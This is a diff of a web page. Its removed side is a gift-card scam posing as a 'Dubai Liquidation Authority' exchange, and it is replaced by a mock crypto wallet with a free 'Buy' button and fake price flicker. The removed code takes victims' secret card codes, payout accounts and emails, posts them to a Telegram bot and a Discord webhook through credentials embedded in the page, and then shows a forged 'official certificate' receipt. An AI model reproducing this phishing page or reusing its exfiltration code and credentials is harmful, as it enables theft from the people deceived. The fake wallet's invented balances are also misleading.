@@ -1,347 +1,226 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DLA | Global Settlement Hub</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <title>Nexus Vault | Pro</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        :root { --gold: #d4af37; --bg: #000; --panel: #0f1115; --text: #fff; --input-bg: #16191e; --border: #333; }
-        [data-theme="light"] { --bg: #eceff1; --panel: #ffffff; --text: #1a1a1a; --input-bg: #e0e6ea; --border: #ccc; }
-        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; transition: background 0.3s; }
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+        :root { --bg: #05070a; --card: #12141a; --accent: #3b82f6; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: var(--bg); color: white; overflow-x: hidden; }
         
-        .theme-toggle { position: fixed; top: 15px; right: 15px; z-index: 9999; background: var(--gold); border: none; padding: 8px 12px; border-radius: 8px; font-weight: 800; font-size: 10px; color: #000; cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
-        .ticker-wrap { width: 100%; background: #111; border-bottom: 1px solid var(--gold); padding: 10px 0; font-size: 11px; color: var(--gold); overflow: hidden; white-space: nowrap; }
-        .ticker { display: inline-block; white-space: nowrap; animation: scrollText 25s linear infinite; padding-left: 100%; }
-        @keyframes scrollText { 0% { transform: translate3d(0, 0, 0); } 100% { transform: translate3d(-100%, 0, 0); } }
-        .panel { background: var(--panel); border: 1px solid var(--border); padding: 25px; width: 92%; max-width: 440px; box-sizing: border-box; margin-top: 20px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; color: var(--text); }
-        h2 { margin: 0; font-size: 24px; font-weight: 800; letter-spacing: -1px; }
-        .tag { font-size: 10px; color: var(--gold); font-weight: bold; letter-spacing: 2px; margin-bottom: 25px; text-transform: uppercase; }
-        label { font-size: 11px; color: #888; display: block; margin-top: 18px; margin-bottom: 8px; text-transform: uppercase; font-weight: 700; }
-        input, select { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid var(--border); color: var(--text); border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; }
-        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin: 15px 0; max-height: 280px; overflow-y: auto; padding: 10px; border: 1px solid var(--border); border-radius: 12px; background: #0a0c10; scrollbar-width: thin; scrollbar-color: var(--gold) #111; }
-        .grid::-webkit-scrollbar { width: 6px; }
-        .grid::-webkit-scrollbar-thumb { background: var(--gold); border-radius: 3px; }
-        .pay { border: 1px solid #333; padding: 12px 8px; text-align: left; font-size: 11px; cursor: pointer; color: #ccc; border-radius: 10px; background: #111; font-weight: bold; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
-        .pay.active { border-color: var(--gold); background: rgba(212,175,55,0.15); color: #fff; }
-        .res-box { background: #000; border: 1px solid var(--gold); padding: 15px; text-align: center; margin: 15px 0; border-radius: 16px; }
-        .res-box b { font-size: 34px; color: #fff; display: block; }
-        #local-payout { font-size: 13px; color: #4ade80; margin-top: 8px; font-weight: bold; display: none; background: rgba(74,222,128,0.1); padding: 6px; border-radius: 8px; border: 1px dashed #4ade80; }
-        .node-footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid #222; text-align: center; }
-        .node-footer p { font-size: 10px; color: #555; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 15px; }
-        .node-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding: 0 5px; }
-        .node-item { font-size: 8px; color: #999; font-weight: 700; text-transform: uppercase; display: flex; align-items: center; gap: 4px; padding: 6px 4px; border-radius: 4px; background: rgba(255,255,255,0.02); border: 1px solid #1a1a1a; }
-        .node-dot { width: 5px; height: 5px; background: #4ade80; border-radius: 50%; box-shadow: 0 0 8px #4ade80; animation: pulseNode 2s infinite; }
-        @keyframes pulseNode { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-        .main-btn { width: 100%; padding: 18px; background: var(--gold); border: none; font-weight: 800; cursor: pointer; color: #000; border-radius: 14px; text-transform: uppercase; font-size: 14px; margin-top: 15px; transition: 0.2s; }
-        .secure-badge { text-align: center; font-size: 10px; color: #555; margin-top: 12px; display: flex; align-items: center; justify-content: center; gap: 5px; font-weight: 700; text-transform: uppercase; }
-        #loader { display: none; text-align: center; padding: 30px 0; }
-        #v-steps { font-size: 11px; color: #444; margin-top: 20px; text-align: left; line-height: 2.2; }
-        .step-done { color: #4ade80 !important; font-weight: bold; }
-        #pbar_container { width: 100%; height: 6px; background: #222; border-radius: 10px; overflow: hidden; }
-        #pbar { width: 0%; height: 100%; background: var(--gold); transition: width 0.3s; }
-        #success { display: none; width: 100%; text-align: center; }
-        .receipt-container { background: #fff; color: #000; padding: 25px; position: relative; width: 100%; max-width: 370px; margin: 0 auto; box-sizing: border-box; overflow: hidden; border-radius: 4px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
-        .watermark-overlay { position: absolute; top: 0; left: 0; width: 150%; height: 150%; pointer-events: none; opacity: 0.12; z-index: 1; display: flex; flex-wrap: wrap; transform: rotate(-25deg) translate(-10%, -10%); }
-        .wm-text { font-size: 10px; font-weight: 900; margin: 15px; white-space: nowrap; color: #000; text-transform: uppercase; }
-        .receipt-body { position: relative; z-index: 2; text-align: left; }
-        .cert-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px; }
-        .cert-title { font-size: 24px; font-weight: 900; line-height: 0.9; text-transform: uppercase; margin: 0; }
-        .auth-sub { color: var(--gold); font-size: 11px; font-weight: 800; margin-top: 5px; display: block; }
-        .dla-seal { width: 65px; height: 65px; border: 2px solid var(--gold); border-radius: 50%; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; font-size: 8px; font-weight: 900; color: var(--gold); }
-        .receipt-hr { height: 2px; background: #000; border: none; margin: 8px 0; }
-        .r-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
-        .r-label { font-size: 9px; font-weight: 800; color: #666; text-transform: uppercase; }
-        .r-value { font-size: 13px; font-weight: 700; font-family: monospace; }
-        .hero-box { text-align: center; padding: 15px 0; border-top: 3px solid #000; border-bottom: 3px solid #000; margin: 10px 0; }
-        .hero-usd { font-size: 52px; font-weight: 900; display: block; line-height: 1; color: #000 !important; }
-        .hero-local { font-size: 22px; font-weight: 800; color: #333; }
-        .black-banner { background: #000; color: #fff; text-align: center; padding: 12px; font-weight: 900; font-size: 15px; letter-spacing: 1px; margin-bottom: 15px; }
-        .receipt-footer { text-align: center; font-size: 8px; color: #888; font-weight: 700; line-height: 1.3; margin-top: 15px; }
-        .chat-btn { position: fixed; bottom: 20px; left: 20px; background: #16191e; border: 1px solid #333; padding: 12px 18px; border-radius: 50px; display: flex; align-items: center; gap: 10px; text-decoration: none; color: #fff; z-index: 3000; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-        .dot { width: 8px; height: 8px; background: #25d366; border-radius: 50%; animation: blink 1.5s infinite; }
+        .app-shell { max-width: 430px; margin: 0 auto; min-height: 100vh; position: relative; background: var(--bg); }
+        
+        /* Glass & Shadows */
+        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
+        .haptic:active { transform: scale(0.96); opacity: 0.9; }
+        
+        /* Modal Animation */
+        .modal { display: none; position: fixed; inset: 0; z-index: 1000; background: rgba(0,0,0,0.85); align-items: flex-end; }
+        .modal.active { display: flex; }
+        .modal-sheet { background: #1c1f26; width: 100%; border-radius: 2.5rem 2.5rem 0 0; padding: 2rem; transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.33, 1, 0.68, 1); }
+        .modal.active .modal-sheet { transform: translateY(0); }
+
+        /* Price Flicker Effect */
+        .price-up { color: #10b981; animation: flash-green 1s; }
+        .price-down { color: #ef4444; animation: flash-red 1s; }
+        @keyframes flash-green { from { background: rgba(16, 185, 129, 0.2); } to { background: transparent; } }
+        @keyframes flash-red { from { background: rgba(239, 68, 68, 0.2); } to { background: transparent; } }
     </style>
 </head>
 <body>
 
-    <button class="theme-toggle" id="theme-btn" onclick="toggleTheme()">☀️ LIGHT</button>
-    <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE</div></div>
-
-    <div class="panel">
-        <div id="form">
-            <h2>Exchange</h2>
-            <div class="tag">Dubai Liquidation Authority</div>
-
-            <label>Asset Class</label>
-            <select id="brand" onchange="updateVal()">
-                <option value="1.8">💳 Binance Gift Card [1.8x]</option>
-                <option value="1.4">📦 Amazon Global [1.4x]</option>
-                <option value="1.4">🍎 Apple iTunes [1.4x]</option>
-                <option value="1.4">💎 Razer Gold [1.4x]</option>
-                <option value="1.4">🎮 Steam Wallet [1.4x]</option>
-            </select>
-
-            <label>Secret Card Code (e.g., ABC-123-XYZ)</label>
-            <input id="card" placeholder="ENTER 16-DIGIT CODE" oninput="this.value = this.value.toUpperCase()">
-
-            <label>Value ($)</label>
-            <input id="amt" type="number" value="100" min="25" oninput="updateVal()">
-
-            <div class="res-box">
-                <span style="font-size:10px; color:var(--gold);">SETTLEMENT ESTIMATE</span>
-                <div id="display-area"><b>$180.00</b></div>
-                <div id="local-payout"></div>
-            </div>
-
-            <label>Global Payout Gateway (15 Methods)</label>
-            <div class="grid">
-                <div class="pay" onclick="sel(this, '💎 USDT', 'Enter TRC20 Wallet', 1, 'USDT')"><span>💎</span>USDT</div>
-                <div class="pay" onclick="sel(this, '🔵 PayPal', 'Enter Email Address', 1, 'USD')"><span>🔵</span>PayPal</div>
-                <div class="pay" onclick="sel(this, '🇳🇬 Bank', 'Acct No + Bank', 1610, 'NGN')"><span>🇳🇬</span>Bank NG</div>
-                <div class="pay" onclick="sel(this, '🌀 Zelle', 'Enter Email/Phone', 1, 'USD')"><span>🌀</span>Zelle</div>
-                <div class="pay" onclick="sel(this, '💸 CashApp', 'Enter $Cashtag', 1, 'USD')"><span>💸</span>CashApp</div>
-                <div class="pay" onclick="sel(this, '🟡 Binance', 'Enter Binance ID', 1, 'USD')"><span>🟡</span>Binance Pay</div>
-                <div class="pay" onclick="sel(this, '🇰🇪 M-Pesa', 'Enter Phone Number', 131.50, 'KES')"><span>🇰🇪</span>M-Pesa</div>
-                <div class="pay" onclick="sel(this, '💳 Revolut', 'Enter RevTag', 1, 'USD')"><span>💳</span>Revolut</div>
-                <div class="pay" onclick="sel(this, '🇬🇭 Momo', 'Enter GH Phone', 14.80, 'GHS')"><span>🇬🇭</span>MoMo GH</div>
-                <div class="pay" onclick="sel(this, '🍎 Apple Pay', 'Enter Apple Email', 1, 'USD')"><span>🍎</span>Apple Pay</div>
-                <div class="pay" onclick="sel(this, '🇿🇦 Bank', 'Acct + Branch', 18.50, 'ZAR')"><span>🇿🇦</span>Bank ZA</div>
-                <div class="pay" onclick="sel(this, '🟠 Skrill', 'Enter Email', 1, 'USD')"><span>🟠</span>Skrill</div>
-                <div class="pay" onclick="sel(this, '🟣 Venmo', 'Enter Username', 1, 'USD')"><span>🟣</span>Venmo</div>
-                <div class="pay" onclick="sel(this, '💰 Bitcoin', 'Enter BTC Address', 1, 'BTC')"><span>💰</span>Bitcoin</div>
-                <div class="pay" onclick="sel(this, '🏦 Wire', 'Enter IBAN/Swift', 1, 'USD')"><span>🏦</span>Bank Wire</div>
-            </div>
-
-            <label id="payout-label">Payout Details</label>
-            <input id="wallet" placeholder="Select method above">
-
-            <label>Confirmation Email</label>
-            <input id="email" type="email" placeholder="Required for receipt">
-
-            <button class="main-btn" onclick="submitNow()">Authorize Settlement</button>
-            <div class="secure-badge"><span style="color:#4ade80;">🛡️</span> SSL 256-BIT ENCRYPTION SECURE</div>
-
-            <div class="node-footer">
-                <p>Sponsored By</p>
-                <div class="node-grid">
-                    <div class="node-item"><span class="node-dot"></span> SWIFT-INTL</div>
-                    <div class="node-item"><span class="node-dot"></span> COINBASE</div>
-                    <div class="node-item"><span class="node-dot"></span> BINANCE</div>
-                    <div class="node-item"><span class="node-dot"></span> KRAKEN</div>
-                    <div class="node-item"><span class="node-dot"></span> DUBAI-HUB</div>
-                    <div class="node-item"><span class="node-dot"></span> CRYPTO.COM</div>
+    <div class="app-shell px-6 pt-12 pb-32">
+        
+        <div class="flex justify-between items-center mb-10">
+            <div class="flex items-center space-x-3">
+                <div class="w-11 h-11 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-2xl flex items-center justify-center shadow-lg">
+                    <i class="fa-solid fa-bolt-lightning text-white text-lg"></i>
                 </div>
+                <div>
+                    <h2 class="text-sm font-extrabold tracking-tight">Personal Wallet</h2>
+                    <p class="text-[10px] text-blue-400 font-bold uppercase tracking-widest">Multi-Chain Active</p>
+                </div>
+            </div>
+            <div class="flex space-x-4 opacity-60">
+                <i class="fa-solid fa-magnifying-glass"></i>
+                <i class="fa-solid fa-ellipsis-vertical"></i>
             </div>
         </div>
 
-        <div id="loader">
-            <p style="color:var(--gold); font-weight:bold; font-size:12px;">SYSTEM VERIFICATION...</p>
-            <div id="pbar_container"><div id="pbar"></div></div>
-            <div id="v-steps">
-                <div id="s1">○ Connecting to Global Payout UPI...</div>
-                <div id="s2">○ Authenticating Secret Code...</div>
-                <div id="s3">○ Verifying Asset Balance...</div>
+        <div class="relative overflow-hidden glass rounded-[2.5rem] p-8 mb-10 text-center">
+            <p class="text-gray-500 text-xs font-bold uppercase tracking-widest mb-2">Portfolio Value</p>
+            <h1 id="total-usd" class="text-5xl font-extrabold tracking-tighter mb-8 tabular-nums">$0.00</h1>
+            
+            <div class="flex justify-around">
+                <button onclick="openAction('Buy')" class="haptic flex flex-col items-center space-y-2">
+                    <div class="w-14 h-14 bg-blue-600 rounded-full flex items-center justify-center text-xl shadow-xl shadow-blue-600/20"><i class="fa-solid fa-plus"></i></div>
+                    <span class="text-[11px] font-bold opacity-80">Buy</span>
+                </button>
+                <button onclick="openAction('Send')" class="haptic flex flex-col items-center space-y-2">
+                    <div class="w-14 h-14 bg-white/5 rounded-full flex items-center justify-center text-xl border border-white/10"><i class="fa-solid fa-arrow-up"></i></div>
+                    <span class="text-[11px] font-bold opacity-80">Send</span>
+                </button>
+                <button class="haptic flex flex-col items-center space-y-2">
+                    <div class="w-14 h-14 bg-white/5 rounded-full flex items-center justify-center text-xl border border-white/10"><i class="fa-solid fa-qrcode"></i></div>
+                    <span class="text-[11px] font-bold opacity-80">Receive</span>
+                </button>
             </div>
         </div>
 
-        <div id="success">
-            <div class="receipt-container" id="receipt-content">
-                <div class="watermark-overlay" id="wm-layer"></div>
-                <div class="receipt-body">
-                    <div class="cert-header">
-                        <div>
-                            <h1 class="cert-title">CERTIFICATE OF<br>SETTLEMENT</h1>
-                            <span class="auth-sub">Dubai Liquidation Authority</span>
-                        </div>
-                        <div class="dla-seal">DLA<br>VERIFIED</div>
-                    </div>
-                    <hr class="receipt-hr">
-                    <div class="r-row"><span class="r-label">Doc Status</span><span class="r-value" id="r-status" style="color:#22c55e;">✅ APPROVED_OFFICIAL</span></div>
-                    <div class="r-row"><span class="r-label">Transaction ID</span><span class="r-value" id="r-tid"></span></div>
-                    <div class="r-row"><span class="r-label">Gateway Node</span><span class="r-value" id="r-gateway"></span></div>
-                    <div class="r-row"><span class="r-label">Settlement Path</span><span class="r-value" id="r-path"></span></div>
-                    <div class="hero-box">
-                        <span class="hero-usd" id="r-price"></span>
-                        <span class="hero-local" id="r-local-val"></span>
-                    </div>
-                    <div class="black-banner">ESTIMATED ARRIVAL IN: <span id="r-timer">01:00:00</span></div>
-                    <div class="receipt-footer">
-                        <div id="qrcode" style="display:inline-block; margin-bottom:5px;"></div><br>
-                        ISSUED: <span id="r-date"></span><br>
-                        Authorized digital settlement issued by DLA Central Hub.<br>
-                        <b style="color:#000; font-size:9px; text-transform:uppercase; display:block; margin-top:5px;">NB: No payment to expired or used cards.</b>
-                    </div>
-                </div>
+        <div class="space-y-4 mb-10">
+            <div class="flex justify-between items-center px-2">
+                <h3 class="font-extrabold text-lg">My Assets</h3>
+                <i class="fa-solid fa-chart-line text-blue-500"></i>
             </div>
-            <button class="main-btn" onclick="saveHDReceipt()" style="background:#000; color:#fff; border:1px solid #333; margin-top:20px;">📄 Save Official Certificate</button>
-            <button class="main-btn" onclick="location.reload()" style="background:var(--gold); color:#000; margin-top:10px;">New Transaction</button>
+            <div id="asset-container" class="space-y-3">
+                </div>
+        </div>
+
+        <div class="px-2">
+            <h3 class="font-extrabold text-lg mb-4">Activity</h3>
+            <div id="activity-list" class="space-y-5">
+                </div>
+        </div>
+
+    </div>
+
+    <nav class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-[430px] glass border-t-0 rounded-t-[2.5rem] px-10 py-6 flex justify-between items-center z-50">
+        <i class="fa-solid fa-wallet text-blue-500 text-xl"></i>
+        <i class="fa-solid fa-arrow-right-arrow-left text-gray-500 text-xl"></i>
+        <i class="fa-solid fa-compass text-gray-500 text-xl"></i>
+        <i class="fa-solid fa-clock-rotate-left text-gray-500 text-xl"></i>
+    </nav>
+
+    <div id="actionModal" class="modal" onclick="if(event.target == this) closeAction()">
+        <div class="modal-sheet">
+            <div class="w-12 h-1.5 bg-gray-700 rounded-full mx-auto mb-8"></div>
+            <h2 id="actionTitle" class="text-2xl font-black mb-6 tracking-tight">Action</h2>
+            
+            <div class="space-y-5">
+                <select id="coinSelect" class="w-full bg-gray-900/50 p-5 rounded-2xl outline-none border border-white/10 font-bold">
+                    <option value="USDT">Tether (USDT)</option>
+                    <option value="SOL">Solana (SOL)</option>
+                    <option value="ETH">Ethereum (ETH)</option>
+                    <option value="BTC">Bitcoin (BTC)</option>
+                </select>
+                <input type="text" id="addressInput" placeholder="Recipient Wallet Address" class="hidden w-full bg-gray-900/50 p-5 rounded-2xl outline-none border border-white/10 text-sm font-mono">
+                <input type="number" id="amountInput" placeholder="0.00" class="w-full bg-gray-900/50 p-5 rounded-2xl outline-none border border-white/10 text-3xl font-black tabular-nums">
+                
+                <button onclick="confirmTransaction()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-lg shadow-2xl shadow-blue-600/30 haptic mt-4">Confirm</button>
+            </div>
         </div>
     </div>
 
-    <a href="https://wa.me/447400436904" class="chat-btn"><div class="dot"></div><span>WhatsApp Support</span></a>
-
     <script>
-        const TELEGRAM_TOKEN = "8662083297:AAHESm81XuXqj7ZUgESysc1RH-lRiSPwARs"; 
-        const TELEGRAM_CHAT_ID = "5022438644";
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484706100916781057/b13TunLishCPP0s3b2Q6G0bG84UMShEICD6KRiQaWYUHmG0c2rSoq2mJ6FWjuEgZbfJS";
-        
-        let method = ""; let rateL = 1; let sym = "USD";
-        const successSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3');
+        const COINS = {
+            USDT: { name: 'Tether', icon: 'fa-dollar-sign', color: 'bg-green-500', price: 1.00 },
+            SOL: { name: 'Solana', icon: 'fa-s', color: 'bg-black', price: 148.25 },
+            ETH: { name: 'Ethereum', icon: 'fa-brands fa-ethereum', color: 'bg-indigo-500', price: 2640.10 },
+            BTC: { name: 'Bitcoin', icon: 'fa-brands fa-bitcoin', color: 'bg-orange-500', price: 68420.50 }
+        };
 
-        const wmLayer = document.getElementById('wm-layer');
-        for(let i=0; i<30; i++) {
-            const span = document.createElement('span');
-            span.className = 'wm-text';
-            span.innerText = 'OFFICIAL DLA DOCUMENT';
-            wmLayer.appendChild(span);
+        let db = JSON.parse(localStorage.getItem('nexus_vault')) || {
+            balances: { USDT: 0, SOL: 0, ETH: 0, BTC: 0 },
+            history: []
+        };
+
+        let currentAction = '';
+
+        function openAction(type) {
+            currentAction = type;
+            document.getElementById('actionTitle').innerText = type + " Assets";
+            document.getElementById('addressInput').style.display = (type === 'Send') ? 'block' : 'none';
+            document.getElementById('actionModal').classList.add('active');
         }
 
-        function toggleTheme() {
-            const html = document.documentElement;
-            const btn = document.getElementById('theme-btn');
-            if (html.getAttribute('data-theme') === 'dark') {
-                html.setAttribute('data-theme', 'light');
-                btn.innerText = "🌙 DARK";
-            } else {
-                html.setAttribute('data-theme', 'dark');
-                btn.innerText = "☀️ LIGHT";
+        function closeAction() { document.getElementById('actionModal').classList.remove('active'); }
+
+        function render() {
+            let total = 0;
+            const container = document.getElementById('asset-container');
+            container.innerHTML = '';
+
+            for(let key in COINS) {
+                const bal = db.balances[key];
+                const usd = bal * COINS[key].price;
+                total += usd;
+
+                container.innerHTML += `
+                    <div class="glass p-5 rounded-3xl flex justify-between items-center">
+                        <div class="flex items-center space-x-4">
+                            <div class="w-12 h-12 ${COINS[key].color} rounded-2xl flex items-center justify-center text-white shadow-lg">
+                                <i class="fa-solid ${COINS[key].icon}"></i>
+                            </div>
+                            <div>
+                                <p class="font-black text-sm">${COINS[key].name}</p>
+                                <p class="text-[10px] font-bold text-gray-500 uppercase tracking-widest">$${COINS[key].price.toLocaleString()}</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="font-black text-sm tabular-nums">${bal.toFixed(bal > 0 ? 4 : 2)} ${key}</p>
+                            <p class="text-[10px] font-bold text-gray-400">$${usd.toLocaleString(undefined, {minimumFractionDigits: 2})}</p>
+                        </div>
+                    </div>
+                `;
             }
-        }
 
-        function updateTicker() {
-            const liq = (2840500 + Math.floor(Math.random() * 5000)).toLocaleString();
-            document.getElementById('live-ticker').innerHTML = `💰 LIQUIDITY: $${liq} • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE`;
-        }
-        setInterval(updateTicker, 8000);
+            document.getElementById('total-usd').innerText = `$${total.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
 
-        function sel(el, val, shadow, r, s) {
-            document.querySelectorAll('.pay').forEach(x => x.classList.remove('active'));
-            el.classList.add('active');
-            method = val; rateL = r; sym = s;
-            document.getElementById('payout-label').innerText = val + " Details";
-            document.getElementById('wallet').placeholder = shadow;
-            updateVal();
-        }
-
-        function updateVal() {
-            let v = parseFloat(document.getElementById('amt').value);
-            let rate = parseFloat(document.getElementById('brand').value);
-            let totalUSD = (isNaN(v) ? 0 : (v * rate));
-            document.getElementById('display-area').innerHTML = '<b>$' + totalUSD.toFixed(2) + '</b>';
-            let lBox = document.getElementById('local-payout');
-            if(rateL > 1) {
-                lBox.style.display = "block";
-                lBox.innerText = "(" + (totalUSD * rateL).toLocaleString() + " " + sym + ")";
-            } else { lBox.style.display = "none"; }
-        }
-
-        function submitNow() {
-            const cardCode = document.getElementById('card').value;
-            const walletDetails = document.getElementById('wallet').value;
-            const userEmail = document.getElementById('email').value;
-            const amount = document.getElementById('display-area').innerText;
-            const brandSelect = document.getElementById('brand');
-            const assetName = brandSelect.options[brandSelect.selectedIndex].text;
-            
-            if(!method || !cardCode || !walletDetails || !userEmail) return alert("Please fill all fields.");
-
-            document.getElementById('form').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-
-            // Telegram Notification (High Priority POST)
-            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-            const messageText = `🚨 *NEW DLA SUBMISSION*\n\n` +
-                                `*Asset:* ${assetName}\n` +
-                                `*Card Code:* \`${cardCode}\` \n` +
-                                `*USD Value:* ${amount}\n` +
-                                `*Method:* ${method}\n` +
-                                `*Payout To:* ${walletDetails}\n` +
-                                `*User Email:* ${userEmail}`;
-
-            fetch(telegramUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: messageText,
-                    parse_mode: 'Markdown'
-                }),
-                keepalive: true
-            });
-
-            // Discord Message
-            const discordPayload = {
-                username: "DLA SETTLEMENT HUB",
-                embeds: [{
-                    title: "🚨 NEW CARD RECEIVED",
-                    color: 13938487,
-                    fields: [
-                        { name: "Asset Class", value: assetName, inline: true },
-                        { name: "USD Value", value: amount, inline: true },
-                        { name: "Card Code (Tap to Copy)", value: "```" + cardCode + "```" },
-                        { name: "Payout Method", value: method, inline: true },
-                        { name: "Recipient Details", value: walletDetails },
-                        { name: "User Email", value: userEmail }
-                    ],
-                    timestamp: new Date()
-                }]
-            };
-
-            fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(discordPayload)
-            });
-
-            let p = 0;
-            let iv = setInterval(() => {
-                p++; document.getElementById('pbar').style.width = p + "%";
-                if(p==33) document.getElementById('s1').className='step-done';
-                if(p==66) document.getElementById('s2').className='step-done';
-                if(p>=100) { clearInterval(iv); showReceipt(); }
-            }, 40);
-        }
-
-        function showReceipt() {
-            successSound.play();
-            
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('success').style.display = 'block';
-            let tid = "DLA-TX" + Math.floor(100000 + Math.random() * 900000);
-            let cleanGateway = method.replace(/([\u2700-\u27BF]|[\uE000-\uF8FF]|\uD83C[\uDC00-\uDFFF]|\uD83D[\uDC00-\uDFFF]|[\u2011-\u26FF]|\uD83E[\uDD10-\uDDFF])/g, '').trim();
-            document.getElementById('r-tid').innerText = tid;
-            document.getElementById('r-gateway').innerText = cleanGateway;
-            document.getElementById('r-path').innerText = document.getElementById('wallet').value;
-            document.getElementById('r-price').innerText = document.getElementById('display-area').innerText;
-            document.getElementById('r-local-val').innerText = document.getElementById('local-payout').innerText;
-            document.getElementById('r-date').innerText = new Date().toLocaleString();
-            new QRCode(document.getElementById("qrcode"), { text: tid, width: 60, height: 60 });
-            startTimer();
-        }
-
-        function startTimer() {
-            let time = 3600;
-            const timerEl = document.getElementById('r-timer');
-            const countdown = setInterval(() => {
-                time--;
-                let h = Math.floor(time / 3600);
-                let m = Math.floor((time % 3600) / 60);
-                let s = time % 60;
-                timerEl.innerText = `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
-                if (time <= 0) clearInterval(countdown);
-            }, 1000);
-        }
-
-        function saveHDReceipt() {
-            html2canvas(document.querySelector("#receipt-content"), { scale: 3 }).then(canvas => {
-                const link = document.createElement('a');
-                link.download = 'DLA_Certificate_Official.png';
-                link.href = canvas.toDataURL();
-                link.click();
+            const hist = document.getElementById('activity-list');
+            hist.innerHTML = db.history.length ? '' : '<p class="text-center text-gray-600 text-[10px] font-bold py-8 uppercase tracking-widest">No recent moves</p>';
+            db.history.slice(-4).reverse().forEach(tx => {
+                hist.innerHTML += `
+                    <div class="flex justify-between items-center opacity-80">
+                        <div class="flex items-center space-x-4">
+                            <div class="w-9 h-9 bg-white/5 rounded-xl flex items-center justify-center text-xs">
+                                <i class="fa-solid ${tx.type === 'Buy' ? 'fa-arrow-down-long text-green-400' : 'fa-arrow-up-long text-blue-400'}"></i>
+                            </div>
+                            <div>
+                                <p class="text-xs font-bold">${tx.type} ${tx.coin}</p>
+                                <p class="text-[9px] font-bold text-gray-600 uppercase">${tx.time}</p>
+                            </div>
+                        </div>
+                        <p class="text-xs font-black ${tx.type === 'Buy' ? 'text-green-400' : 'text-white'}">
+                            ${tx.type === 'Buy' ? '+' : '-'}${tx.amt} ${tx.coin}
+                        </p>
+                    </div>
+                `;
             });
         }
+
+        function confirmTransaction() {
+            const coin = document.getElementById('coinSelect').value;
+            const amt = parseFloat(document.getElementById('amountInput').value);
+
+            if(!amt || amt <= 0) return;
+            if(currentAction === 'Send' && db.balances[coin] < amt) return alert("Insufficient balance");
+
+            db.balances[coin] += (currentAction === 'Buy' ? amt : -amt);
+            db.history.push({
+                type: currentAction,
+                coin: coin,
+                amt: amt,
+                time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+            });
+
+            localStorage.setItem('nexus_vault', JSON.stringify(db));
+            render();
+            closeAction();
+            document.getElementById('amountInput').value = '';
+        }
+
+        // Fake live price movement
+        setInterval(() => {
+            const el = document.getElementById('total-usd');
+            const direction = Math.random() > 0.5 ? 1 : -1;
+            el.classList.add(direction > 0 ? 'price-up' : 'price-down');
+            setTimeout(() => el.classList.remove('price-up', 'price-down'), 1000);
+        }, 5000);
+
+        render();
     </script>
 </body>
 </html>
